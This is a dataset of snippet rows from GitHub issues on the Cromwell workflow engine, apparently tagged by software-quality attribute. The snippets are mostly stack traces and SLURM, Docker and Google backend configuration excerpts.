cromwell.util.JsonFormatting.WdlValueJsonFormatter$WdlValueJsonFormat$$anonfun$write$2.apply(WdlValueJsonFormatter.scala:17); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(I",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1703:4517,config,configuration,4517,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1703,1,['config'],['configuration']
Modifiability,"tion: resource not found on classpath: application.conf, application.json: java.io.IOException: resource not found on classpath: application.json, application.properties: java.io.IOException: resource not found on classpath: application.properties; at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:236); at com.typesafe.config.impl.ConfigImpl.parseResourcesAnySyntax(ConfigImpl.java:133); at com.typesafe.config.ConfigFactory.parseResourcesAnySyntax(ConfigFactory.java:1083); at com.typesafe.config.impl.SimpleIncluder.includeResourceWithoutFallback(SimpleIncluder.java:123); at com.typesafe.config.impl.SimpleIncluder.includeResources(SimpleIncluder.java:109); at com.typesafe.config.impl.ConfigParser$ParseContext.parseInclude(ConfigParser.java:181); at com.typesafe.config.impl.ConfigParser$ParseContext.parseObject(ConfigParser.java:237); at com.typesafe.config.impl.ConfigParser$ParseContext.parseValue(ConfigParser.java:103); at com.typesafe.config.impl.ConfigParser$ParseContext.parse(ConfigParser.java:415); at com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:264); at com.typesafe.config.ConfigFactory$1.call(ConfigFactory.java:261); at com.typesafe.config.impl.ConfigImpl$L",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1795,Config,ConfigParser,1795,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigParser']
Modifiability,"tion:; {; ""cromwellId"" : ""cromid-4defb12"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; Uncaught error from thread [cromwell-system-akka.dispatchers.engine-dispatcher-4]: Uncaught error from thread [cromwell-system-akka.dispatchers.service-dispatcher-7]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-systemunable to create new native thread, Uncaught error from thread [cromwell-system-akka.dispatchers.io-dispatcher-15]; ]: unable to create new native thread, shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]; [...]; ```. So I tried following the HPC/SLURM instructions and made a conf file:; ```; include required(classpath(""application"")). webservice {; port = 8080; }. backend {; providers {; Sherlock {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; Int runtime_minutes = 2; Int cpus = 1; Int requested_memory_mb_per_core = 1000; String queue = ""short""; """""". submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-c "" + cpus} \; --mem-per-cpu ${requested_memory_mb_per_core} \; --wrap ""/bin/bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }. default = Sherlock; }; ```. But I get the same error on `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run hello.wdl `. Any ideas what is going on? Perhaps this is some restriction for login nodes? I suppose I could submit a SLURM job to run Cromwell to then submit my actual jobs but that seems very clunky. Edit: can confirm that if I submit `java -Dconfig.file=/home/users/tbenst/cromwell/sherlock.conf -jar ~/cromwell/cromwell-48.jar run",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5395:1984,config,config,1984,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5395,1,['config'],['config']
Modifiability,"tionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:697); 	at scala.util.Try$.apply(Try.scala:209); 	... 25 more. [2019-02-13 22:18:20,91] [error] WorkflowManagerActor Workflow bc35173d-fde7-4727-8ae1-d4d3f132296c failed (during ExecutingWorkflowState): java.util.concurrent.ExecutionException: Boxed Error; 	at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); 	at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); 	at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); 	at scala.concurrent.Promise$.fromTry(Promise.scala:138); 	at scala.concurrent.Future$.fromTry(Future.scala:635); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:697); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:989); 	at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:983); 	at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustPoll(AsyncBackendJobExecutionActor.scala:76); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:89); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunctio",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710:4588,Config,ConfigAsyncJobExecutionActor,4588,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-463475710,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"tionActor.aroundReceive(StandardInitializationActor.scala:42); cromwell_1 | 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); cromwell_1 | 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); cromwell_1 | 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); cromwell_1 | 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); cromwell_1 | 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); cromwell_1 | 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); cromwell_1 | 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); cromwell_1 | 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); cromwell_1 | 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); cromwell_1 | Caused by: wdl4s.parser.WdlParser$SyntaxError: ERROR: Variable docker_user does not reference any declaration in the task (line 31, col 25):; cromwell_1 | ; cromwell_1 | ${""--user "" + docker_user} \; cromwell_1 | ^; cromwell_1 | ; cromwell_1 | Task defined here (line 16, col 6):; cromwell_1 | ; cromwell_1 | task submit_docker {; cromwell_1 | ^; cromwell_1 | ; cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42$$anonfun$apply$19$$anonfun$apply$22.apply(WdlNamespace.scala:405); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42$$anonfun$apply$19$$anonfun$apply$22.apply(WdlNamespace.scala:403); cromwell_1 | 	at scala.collection.TraversableLike$WithFilter$$anonfun$map$2.apply(TraversableLike.scala:683); cromwell_1 | 	at scala.collection.immutable.List.foreach(List.scala:381); cromwell_1 | 	at scala.collection.TraversableLike$WithFilter.map(TraversableLike.scala:682); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42$$anonfun$apply$19.apply(WdlNamespace.scala:403); cromwell_1 | 	at wdl4s.WdlNamespace$$anonfun$42$$anonfun$apply$19.apply(WdlNamespace.scala:402); cromwell_1 | 	at scala.collection.TraversableLike$$anonfun$flatMap$1.apply(TraversableLike.scala:241); cromwell_1 | 	at scala.collection.Trave",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:5854,Variab,Variable,5854,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['Variab'],['Variable']
Modifiability,tionValidation$$anonfun$fromDeclarations$1.apply(DeclarationValidation.scala:17); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendWorkflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2237,Config,ConfigInitializationActor,2237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['Config'],['ConfigInitializationActor']
Modifiability,"titute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/async/AsyncBackendJobExecutionActor.scala) file, and some of the important stores would be the [ExecutionStore](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/core/src/main/scala/cromwell/core/ExecutionStore.scala), the [BackendJobDescriptor and BackendJobDescriptorKey](https://github.com/broadinstitute/cromwell/blob/832387f34f57062abd2ce6cfa9e206407170ba72/backend/src/main/scala/cromwell/backend/package.scala#L17-31), which contain the [Call containing the AST](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Call.scala#L10-61) and sequence of [Tasks](https://github.com/broadinstitute/wdl4s/blob/d7e19c9f4dfbc5ad912cf641af9c640eb8a9a9c7/src/main/scala/wdl4s/Task.scala). Since the WorkflowManagerActor (WMA) is just an asynchronous queue selecting the workflow based on the root and its dependencies, then it sounds to be just a scheduling pool service submitting to the EJEA, which prepares it for the specific backend. The recovery for the EJEA is assumed to be an uniform designed protocol, which prepares the execution for the specific backend. . Regarding the backend recovery, since at the core the implementations is really Java (even though everything is in Scala), one can save the running state periodically through serialized snapshots, using something like [Apache JavaFlow](http://commons.apache.org/sandbox/commons-javaflow/) or another similar approach. If this becomes too cumbersome and the cost of resubmitting a job to a specific Backend is on the average time-span not excessive, then resubmitting the whole job might be Occam's razor. There are other approaches, depending on the preferability of flexibility, and I am sure I might have miswrote/misinterpreted something here based on my periodic analysis of the source code - so feel free to correct me :). Thanks,; ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371:1723,sandbox,sandbox,1723,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1117#issuecomment-230645371,1,['sandbox'],['sandbox']
Modifiability,"titute/cromwell/tree/develop/cromwell.examples.conf), along with backend provider examples in the [Example Providers Folder](https://www.github.com/broadinstitute/cromwell/tree/develop/cromwell.example.backends).; 4. After seeing that a big perf bottleneck was Cromwell hashing files, I enabled all of the call caching options and also enabled `check-sibling-md5` so that it could use pre-computed hashes instead. To my surprise, this did nothing because it only works when the configured `actor-factory` is `cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory`! The documentation does **not** make that sufficiently clear:; - The `hashing-strategy` and `check-sibling-md5` options are listed under the `Local Filesystem` section (and configured under `config.filesystems.local.caching` which led me to believe they would work with any provider configured for local filesystem (e.g., TES). This is not the case, and they are in fact tied to the actor factory implementation and the only actor factory with support is `ConfigBackendLifecycleActorFactory` (as far as I could tell).; - The documentation does make mention of mention:; > When running a job on the **Config (Shared Filesystem) backend**, Cromwell provides some additional options in the backend's config section. However neither a Config nor a Shared Filesystem backend are mentionend in the documentation, although SFS is found under [Filesystems](https://cromwell.readthedocs.io/en/stable/filesystems/Filesystems/). Therefore, I think the docs need additional clarity on config concepts like provider and actor-factory vs what we are referring to at a high-level as a ""backend"" (which is in fact just the `ConfigBackendLifecycleActorFactory` implementation with some config specific to that ""backend""). As well, I would suggest an implementation of the call caching options should be made in the StandardLifecycleActorFactory so that all backends inherit the behavior, or else those keys should be moved to the backend-s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4810:2817,Config,ConfigBackendLifecycleActorFactory,2817,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4810,1,['Config'],['ConfigBackendLifecycleActorFactory']
Modifiability,tor.$anonfun$runtimeEnvironmentPathMapper$2(StandardAsyncExecutionActor.scala:475); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironmentPathMapper(StandardAsyncExecutionActor.scala:475); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironmentPathMapper$(StandardAsyncExecutionActor.scala:473); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironmentPathMapper(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$runtimeEnvironment$1(StandardAsyncExecutionActor.scala:479); 	 at mouse.AnyOps$.$bar$greater$extension(any.scala:8); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.runtimeEnvironment$(StandardAsyncExecutionActor.scala:479); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.runtimeEnvironment(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:637); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand$(StandardAsyncExecutionActor.scala:607); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:215); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents(StandardAsyncExecutionActor.scala:383); 	 at cromwell.backend.standard.StandardAsyncExecutionActor.commandScriptContents$(StandardAsyncExecutio,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6757:5066,config,config,5066,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6757,1,['config'],['config']
Modifiability,tor.ActorInitializationException$.apply(Actor.scala:193); 	at akka.actor.ActorCell.create(ActorCell.scala:669); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services'; 	at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156); 	at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188); 	at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268); 	at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:35); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; ```. I tried adding the [reference services block](https://github.com/broadinstitute/cromwell/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:1336,config,config,1336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['config'],['config']
Modifiability,tor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:264); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:258); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:258); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.apply(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.withRetry(AsyncBackendJobExecutionActor.scala:52); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$class.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:56); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:80); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:171); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:496); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:113); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	... 4 more; ```,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:12439,config,config,12439,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,2,"['Config', 'config']","['ConfigAsyncJobExecutionActor', 'config']"
Modifiability,tor.scala:140); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeScriptContents(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:124); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:121); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$executeAsync$1(StandardAsyncExecutionActor.scala:599); at scala.util.Try$.apply(Try.scala:209); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync(StandardAsyncExecutionActor.scala:599); at cromwell.backend.standard.StandardAsyncExecutionActor.executeAsync$(StandardAsyncExecutionActor.scala:599); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeAsync(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:912); at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:904); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:208); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); at cromwell.core.retry.Retry$.withRetry(Retry.scala:37); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:88); at scala,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:3160,Config,ConfigAsyncJobExecutionActor,3160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"tring job_id; cromwell_1 | String job_name; cromwell_1 | String cwd; cromwell_1 | String out; cromwell_1 | String err; cromwell_1 | String script; cromwell_1 | String? docker Int? max_runtime = 2; cromwell_1 | command {; cromwell_1 | /bin/bash ${script}; cromwell_1 | }; cromwell_1 | }; cromwell_1 | ; cromwell_1 | ; cromwell_1 | task submit_docker {; cromwell_1 | ; cromwell_1 | String job_id; cromwell_1 | String job_name; cromwell_1 | String cwd; cromwell_1 | String out; cromwell_1 | String err; cromwell_1 | String script; cromwell_1 | ; cromwell_1 | String docker_cwd; cromwell_1 | String? docker Int? max_runtime = 2; cromwell_1 | command {; cromwell_1 | ; cromwell_1 | docker run \; cromwell_1 | --rm -i \; cromwell_1 | ${""--user "" + docker_user} \; cromwell_1 | --entrypoint /bin/bash \; cromwell_1 | -v ${cwd}:${docker_cwd} \; cromwell_1 | ${docker} ${script}; cromwell_1 | ; cromwell_1 | }; cromwell_1 | }; cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:50); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:37); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:40); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:39); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:49); cromwell_1 | 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:48); cromwell_1 | 	at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2284:2719,Config,ConfigWdlNamespace,2719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2284,1,['Config'],['ConfigWdlNamespace']
Modifiability,"tter_count,; m2_extra_args = select_first([m2_extra_args, """"]) + "" --max-mnp-distance 0"",; gatk_override = gatk_override,; gatk_docker = gatk_docker,; preemptible = preemptible,; max_retries = max_retries,; pon = pon,; pon_idx = pon_idx,; gnomad = gnomad,; gnomad_idx = gnomad_idx; }; }. output {; Array[File] normal_calls = Mutect2.filtered_vcf; Array[File] normal_calls_idx = Mutect2.filtered_vcf_idx. }; }. ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; ```; include required(classpath(""application"")); google {; application-name = ""cromwell""; auths = [; { ; name = ""application-default""; scheme = ""application_default""; }; ]; }; engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }; backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""calico-uk-biobank""; compute-service-account = ""default""; // Base bucket for workflow executions; root = ""nicholas-b-test""; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; }; filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }; }; }; }; }; }; system {; input-read-limits {; lines = 12800000; bool = 7; int = 19; float = 50; string = 12800000; json = 12800000; tsv = 12800000; map = 12800000; object = 12800000; }; }; ``",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5352:5350,config,config,5350,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5352,1,['config'],['config']
Modifiability,"tute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->; I clone the source code and assembly the jar. when try to run a sge job, I got and error. the log is following:. [2018-06-21 20:36:29,51] [error] DispatchedConfigAsyncJobExecutionActor [7ec0863atestsge.filter:NA:1]: Error attempting to Execute; java.lang.IllegalArgumentException: No coercion defined from '1' of type 'eu.timepit.refined.api.Refined' to 'Int'.; at wom.types.WomType.coerceRawValue(WomType.scala:36); at wom.types.WomType.coerceRawValue$(WomType.scala:27); at wom.types.WomIntegerType$.coerceRawValue(WomIntegerType.scala:9); at cromwell.backend.impl.sfs.config.DeclarationValidation.$anonfun$extractWdlValueOption$1(DeclarationValidation.scala:113); at scala.Option.map(Option.scala:146); at 